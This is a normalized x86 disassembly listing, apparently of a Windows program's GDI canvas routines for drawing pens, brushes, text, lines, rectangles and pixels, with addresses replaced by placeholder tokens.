mov edx esp
mov eax esi
call sub_46d544
mov [ esp + 0xe ] bl
mov edx esp
mov eax esi
call sub_46d55c
sub_46da30
push ebx
push esi
add esp 0xffffff74
mov esi edx
mov ebx eax
mov eax ebx
call sub_46da28
cmp esi eax
je r-xdata
add esp 0x8c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46d544
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_46d55c
sub_46da68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov edx rw-data
mov eax [ rw-data ]
call sub_46c414
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46dab4
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_46c4f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46dae8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46db88
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_46cf68
xor eax eax
push ebp
push sub_46db6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c638
movzx edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_46dcd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46db72
mov eax [ ebp - 0x8 ]
call sub_46cf78
retn
sub_46dba0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_46dbb8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46dbfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c5bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc04
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46dc10
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_46dc08
cmp esi eax
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46dba0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_46dbb8
sub_46dc40
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_46c3fc
xor eax eax
push ebp
push sub_46dcc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_46c408
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_46cf24
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_46dcf4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax esi
call sub_46dcec
cmp bl al
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_46dba0
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_46dbb8
sub_46dd2c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_46dd24
cmp esi eax
je r-xdata
mov edx esp
mov eax ebx
call sub_46dba0
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_46dbb8
sub_46dd60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov edx rw-data
mov eax [ rw-data ]
call sub_46c414
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46dda8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_46c4f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46dddc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46de6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_46cf68
xor eax eax
push ebp
push sub_46de4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c638
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de56
mov eax [ ebp - 0x8 ]
call sub_46cf78
retn
sub_46de84
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_46dea0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46cf68
xor eax eax
push ebp
push sub_46dee5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c5bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46deec
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46def0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_46dea0
add esp 0x10
pop edi
pop esi
retn
sub_46df1c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_46df14
cmp esi eax
jne r-xdata
mov edx esp
mov eax ebx
call sub_46de84
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov eax ebx
call sub_46e050
cmp al 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_46dea0
mov [ esp + 0xc ] 0x0
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_46e050
test al al
je r-xdata
sub_46df70
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_46c3fc
xor edx edx
push ebp
push sub_46e03e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_46c408
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_46cf24
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_46e058
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax esi
call sub_46e050
cmp bl al
jne r-xdata
mov edx esp
mov eax esi
call sub_46de84
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_46dea0
mov [ esp + 0x4 ] 0xffffff
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_46df14
cmp eax 0xffffff
je r-xdata
sub_46e0ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
lea eax [ edi + 0x3c ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_46eb1c
lea eax [ edi + 0x3c ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46da68
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_46eb3c
lea eax [ edi + 0x3c ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_46eb5c
lea eax [ edi + 0x3c ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
movzx eax [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_424ab8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46e170
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_424b9c
xor edx edx
mov eax esi
call sub_46e950
mov eax [ esi + 0xc ]
call sub_4481b0
mov eax [ esi + 0x10 ]
call sub_4481b0
mov eax [ esi + 0x14 ]
call sub_4481b0
lea eax [ esi + 0x3c ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46e1cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_46e9a4
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46e254
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax [ ebx + 0x14 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_432a2c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_46e300
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax [ ebx + 0x14 ]
call sub_46df70
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_46e33c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax [ ebx + 0x14 ]
call sub_46df70
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_46e378
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_46e3d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_46e404
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_46e440
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46e488
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_46e4c4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x38 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_46e8c8
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_46e4f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call j_sub_449880
xor eax eax
push ebp
push sub_46e5be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax ebx
call sub_46e4c4
cmp al 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_46e724
inc eax
add edi eax
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
push esi
mov eax [ ebp + 0x8 ]
call sub_449db8
push eax
push 0x0
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutW
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_46e724
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46e3d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5c5
lea eax [ ebp + 0x8 ]
call j_sub_449348
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4494dc
sub_46e5d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xc ] eax
xor edx edx
mov esi rw-data
jae r-xdata
and eax 0x7f
bt edi eax
inc edx
add esi 0x4
cmp dl 0x12
jne r-xdata
mov eax [ esi ]
or [ ebp - 0xc ] eax
mov eax edx
cmp al 0x1f
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e8c8
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov eax [ ebx ]
call sub_449db8
push eax
mov eax [ ebp - 0x10 ]
push eax
call DrawTextExW
test edi 0x200
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ ebx ]
mov eax ebx
call sub_4494dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
call sub_449db8
call sub_4360a4
mov edx eax
mov eax ebx
call sub_449fd0
sub_46e684
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_46e711
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx [ r-xdata ]
mov eax esi
call sub_46e9a4
xor eax eax
mov [ edi ] eax
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov eax [ esi + 0x4 ]
push eax
call GetTextExtentPoint32W
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e718
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_46e724
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_46e684
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46e740
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_46e684
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46e760
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_46e7ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x54 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e7b3
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_46e3b0
sub_46e80c
push ebx
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_46e834
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_46e3d8
pop ecx
pop edx
pop edi
pop esi
retn
sub_46e854
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_46e880
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_46e9a4
mov eax [ ebp + 0x8 ]
call sub_46cf24
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46e8ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
movzx edx [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_46e950
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_46e8ec
mov edx esp
mov eax ebx
call sub_46e80c
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_46e834
sub_46e9a4
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx ebx [ esi + 0x8 ]
not ebx
and bl [ esp ]
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_46ea44
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
test bl 0x8
je r-xdata
mov eax esi
call sub_46ea70
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_46eaa0
sub_46ea44
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_46d5ec
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_46ea70
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_46dc40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_46eaa0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_46df70
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_46df70
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_46e050
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_46df14
call sub_46cf24
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_46ebc4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46ec0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec15
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_46ec18
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
xor eax eax
mov [ ebp - 0x204 ] eax
xor eax eax
push ebp
push sub_46ecb4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_46ebc4
push 0x0
push 0x100
lea eax [ ebp - 0x200 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageW
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
lea edx [ ebp - 0x200 ]
mov ecx 0x100
call sub_449f14
mov ecx [ ebp - 0x204 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ecbb
lea eax [ ebp - 0x204 ]
call j_sub_449348
retn
sub_46ecd0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
